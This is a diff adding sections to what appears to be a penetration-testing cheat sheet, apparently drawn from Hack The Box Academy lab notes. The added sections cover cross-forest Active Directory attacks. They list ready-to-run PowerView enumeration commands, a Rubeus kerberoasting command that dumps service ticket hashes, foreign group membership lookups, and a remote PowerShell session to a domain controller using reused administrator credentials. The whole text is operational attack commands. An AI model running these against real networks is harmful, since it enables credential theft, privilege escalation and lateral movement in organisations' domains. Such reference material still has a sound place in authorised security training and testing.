@@ -1582,6 +1582,22 @@ OR
 $ raiseChild.py -target-exec <Parent Domain Controller IP address> <child domain>/<username>
 ```
 
+- Cross-Forest Kerberoasting Trusts (Windows - Rubeus)
+
+```
+PS C:\> Get-DomainUser -SPN -Domain <domain> | select SamAccountName
+PS C:\> Get-DomainUser -Domain <domain> -Identity <username> |select samaccountname,memberof
+PS C:\> .\Rubeus.exe kerberoast /domain:<domain> /user:<username> /nowrap
+```
+
+- Cross-Forest Admin Password Re-Use & Group Memberships (Windows - PowerView)
+
+```
+PS C:\> Get-DomainForeignGroupMember -Domain <domain>
+PS C:\htb> Convert-SidToName <SID>
+PS C:\> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential <domain>\administrator
+```
+
 #5. - Privilege Escalation
 -----------------------------------------
 
